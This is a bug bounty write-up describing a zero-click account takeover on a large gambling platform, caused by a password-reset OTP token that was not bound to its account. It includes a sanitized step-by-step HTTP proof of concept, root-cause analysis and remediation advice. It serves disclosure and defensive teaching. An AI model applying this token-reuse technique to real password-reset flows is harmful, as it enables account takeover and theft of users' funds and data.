---
layout: post
title: "Zero‑Click ATO via Unbound Password‑Reset Token in one of the world's largest gambling platforms"
date: 2025-10-18T00:14:54+00:00
img_dir: "/assets/2025-10-18-zero-click-ato-gambling-platform"
image:
  path: "/assets/2025-10-18-zero-click-ato-gambling-platform/cover.jpg"
  width: 1200
  height: 800
  alt: "Zero-Click ATO via Unbound Password-Reset Token"
description: "How a single-use OTP flow token not bound to the correct subject enabled a zero‑click account takeover."
categories: [bugbounty]
---
![Cover]({{ page.img_dir | relative_url }}/cover.png) 



> **Disclosure note**: The issue described here has been **fixed** by the vendor. All domains, identifiers and sensitive details have been **redacted**. This post is for educational purposes only and mirrors a bug bounty report I submitted. The target is one of the **largest gambling platforms in the world**. Bounty awarded: **€3,500**.

# TL;DR

A password-reset flow set a cookie (`OTP_TOKEN`) after OTP validation. That token was **single-use** but **not bound** to the subject (email/account) it was issued for. An attacker could validate OTP for **their own account** to get a fresh `OTP_TOKEN`, then immediately use that token to **confirm** the password reset for a **different** account (the victim) — as long as they supplied the victim’s `jwt` and `accountId` (returned by `/generate`).

**Impact:** zero‑click **Account Takeover (ATO)** → direct wallet access/withdrawals and exposure of personal/financial data.  
**My proposed CVSS v3.1:** **AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N = 9.8 (Critical)**.  
**Program triage:** **High**, arguing that knowledge of a **non‑public email** tied to a public username made **Attack Complexity = High**, thus lowering the score. I don’t fully agree, but I respect the ruling.

---

## Background

During the password reset flow, after a successful OTP validation, the backend returned a cookie (here referred to as `OTP_TOKEN`). This token was treated as a **flow authorization token** for the final reset step (`/recovery/password/confirm`). Crucially, it was:
- **Single‑use** (consumed on the first successful confirm), yet
- **Not bound** to the identity/transaction for which it was issued (no binding to `accountId`/`email`/`requestId`/`transaction_type`).

All testing was performed with my **own test accounts**. No third‑party accounts or data were accessed.

---

## Affected (Redacted) Endpoints

> API base URL intentionally redacted. Only paths are shown.

- `POST /api/otp-core-ms/v2/generate`
- `POST /api/otp-core-ms/v1/validate`
- `POST /api/account-ms/v1/recovery/password/confirm`

---

## Vulnerability Overview

1. **Unbound flow token:** After `/validate`, the server set `OTP_TOKEN` (cookie). That token was **accepted** by `/confirm` **even if** the `jwt`/`accountId` in the JSON body belonged to **another account**.  
2. **Single‑use nuance:** The token is **not reusable**, so the attacker must **not** use it for their own account. They must spend the token **once** — on the victim’s `/confirm` within the token TTL.  
3. **Result:** A successful **cross‑account password reset** (zero‑click from the victim’s perspective).

---

## Step‑by‑Step PoC (Sanitized)

Let’s use two demo identities:

- **Account A (attacker):** `attacker@example.com`
- **Account B (victim):** `victim@example.com`

> ⚠️ The token is single‑use. After `/validate` for Account A, **do not** call `/confirm` for A. Use the token once — to confirm the reset for **B**.

### 1) Generate OTP for **Account A** (attacker)

**Request**
```http
POST /api/otp-core-ms/v2/generate HTTP/2
Host: [redacted]
Content-Type: application/json

{"username":"attacker","email":"attacker@example.com","channel":"email","transaction_type":"recovery_password"}
```

**Response (excerpt)**
```http
HTTP/2 200 OK
Content-Type: application/json
Content-Length: [redacted]

{"status":"SUCCESS","channel":62,"requestId":"[GUID]","datetime":"[DD-MM-YYYY HH:mm:ss]","data":{"resend_left":9},
  "accountId":[ATTACKER_ACCOUNT_ID],
  "accountCode":"[REDACTED]",
  "firstName":"[REDACTED]","lastName":"[REDACTED]","birthDate":"[REDACTED]",
  "jwt":"<REDACTED_JWT>"}
```

### 2) Validate OTP for **Account A** and obtain `OTP_TOKEN`

**Request**
```http
POST /api/otp-core-ms/v1/validate HTTP/2
Host: [redacted]
Content-Type: application/json

{"otp":"8275","channel":"email","transaction_type":"modify_pass","email":"attacker@example.com"}
```

**Response**
```http
HTTP/2 200 OK
Content-Type: application/json
Content-Length: 24
Set-Cookie: OTP_TOKEN=53472994; Max-Age=300; Path=/; HttpOnly; SameSite=None; Secure

{"data":{"status":"OK"}}
```

> The attacker now has a **single‑use** `OTP_TOKEN` valid for a short TTL (e.g., ~5 minutes).

### 3) Generate reset for **Account B** (victim) to obtain victim’s `jwt` and `accountId`

**Request**
```http
POST /api/otp-core-ms/v2/generate HTTP/2
Host: [redacted]
Content-Type: application/json

{"username":"victim","email":"victim@example.com","channel":"email","transaction_type":"recovery_password"}
```

**Response (success shape)**
```http
HTTP/2 200 OK
Content-Type: application/json

{"status":"SUCCESS","channel":62,"requestId":"[GUID]","datetime":"[DD-MM-YYYY HH:mm:ss]","data":{"resend_left":[int]},
  "accountId":[VICTIM_ACCOUNT_ID],"accountCode":"[REDACTED]",
  "firstName":"[REDACTED]","lastName":"[REDACTED]","birthDate":"[REDACTED]",
  "jwt":"<REDACTED_JWT>"}
```

### 4) **Immediately** confirm reset for **Account B** using `OTP_TOKEN` from **Account A**

**Request**
```http
POST /api/account-ms/v1/recovery/password/confirm HTTP/2
Host: [redacted]
Content-Type: application/json
Cookie: OTP_TOKEN=53472994;

{"jwt":"<VICTIM_JWT>","accountId":<VICTIM_ACCOUNT_ID>,
  "password":"Str0ngP@ssw0rd!","contact":"victim@example.com"}
```

**Response**
```http
HTTP/2 200 OK
Content-Type: application/json
Content-Length: [redacted]

{"status":"SUCCESS","channel":62,"requestId":"[GUID]","datetime":"[DD-MM-YYYY HH:mm:ss]","error":null}
```

**Outcome:** The victim’s password is reset successfully, even though the `OTP_TOKEN` originated from the attacker’s OTP validation.

---

## Why This Works (Root Cause)

- The `/confirm` authorization relies on a post‑OTP token (`OTP_TOKEN`) that is **not bound** (server‑side) to the **subject** of the reset: neither to the `accountId`/`email` nor to the specific `requestId`/`jwt`/`transaction_type` that created it.  
- While the token is **single‑use**, that one use can target **any** account within its TTL, as long as the attacker supplies a valid `jwt`/`accountId` for that target.

---

## Impact

- **Zero‑click Account Takeover:** The victim performs **no action**; the attacker completes the reset using their own post‑OTP token.  
- **Direct funds exposure:** Immediate access to wallet/balance and the ability to **withdraw** funds (subject to in‑app flows/KYC).  
- **Sensitive data exposure:** Access to personal data and, depending on views, financial/payment metadata (deposit/withdrawal history, saved payment method identifiers, billing addresses, DoB, KYC docs, etc.).  
- **At‑scale abuse:** The full ATO can be automated within the token TTL.

---


## Remediation Recommendations

1. **Strong binding of the flow token:** Bind the post‑OTP token to `accountId`/`email`, `transaction_type`, and the originating `requestId`/`jwt`.  
2. **Single‑use & consume on success:** Ensure the token is one‑time and invalidated immediately after use.  
3. **Strict consistency checks:** Reject `/confirm` if token subject ≠ provided `jwt`/`accountId`/`contact`.  
4. **Minimize data in `/generate`:** Avoid returning excessive PII or tokens; prefer a generic “If the account exists…” response.  
5. **Defense‑in‑depth:** Rate‑limits, anomaly detection (e.g., token for A used with B), invalidation chains (new `/generate` invalidates prior tokens), and thorough audit logging.

---

## Severity & Bounty

- **My proposed CVSS v3.1:** **AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N = 9.8 (Critical)**.  
- **Vendor triage:** **High** — justified by the program because the attack assumes knowledge of a **non‑public email** bound to a public username, which they consider to increase **Attack Complexity**.  
- **Bounty awarded:** **€3,500**.

I appreciate the program’s timely remediation and fair handling of the bounty discussion.



